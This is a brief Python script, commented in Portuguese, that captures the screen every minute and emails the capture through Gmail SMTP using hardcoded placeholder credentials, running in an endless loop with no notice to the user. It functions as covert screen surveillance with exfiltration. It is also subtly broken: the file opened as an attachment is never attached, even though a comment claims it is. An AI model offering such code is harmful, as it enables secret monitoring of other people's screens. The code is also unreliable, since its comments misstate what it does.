import smtplib
import time
import os
import schedule
import pyscreenshot as ImageGrab  

def take_screenshot_and_send():
    try:
        # Captura um screenshot
        screenshot = ImageGrab.grab()

        
        screenshot_path = '/tmp/screenshot.png' 
        screenshot.save(screenshot_path)

        
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
        sender_email = 'email@gmail.com'
        sender_password = 'senha'

        # Configuração do e-mail
        receiver_email = 'email@gmail.com'
        subject = 'Screenshot capturado'

        # Conteúdo do e-mail
        body = 'Segue o screenshot capturado.'

        # Construção do e-mail
        message = f"Subject: {subject}\n\n{body}"

        # Conexão com o servidor SMTP
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)

        # Envia o e-mail com o screenshot anexado
        with open(screenshot_path, 'rb') as attachment:
            server.sendmail(sender_email, receiver_email, message.encode('utf-8'))

        # Fecha a conexão com o servidor SMTP e remove o arquivo temporário
        server.quit()
        os.remove(screenshot_path)
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

# Agendamento para capturar screenshot a cada minuto
schedule.every(1).minutes.do(take_screenshot_and_send)

# Loop para manter o agendamento em execução
while True:
    schedule.run_pending()
    time.sleep(1)
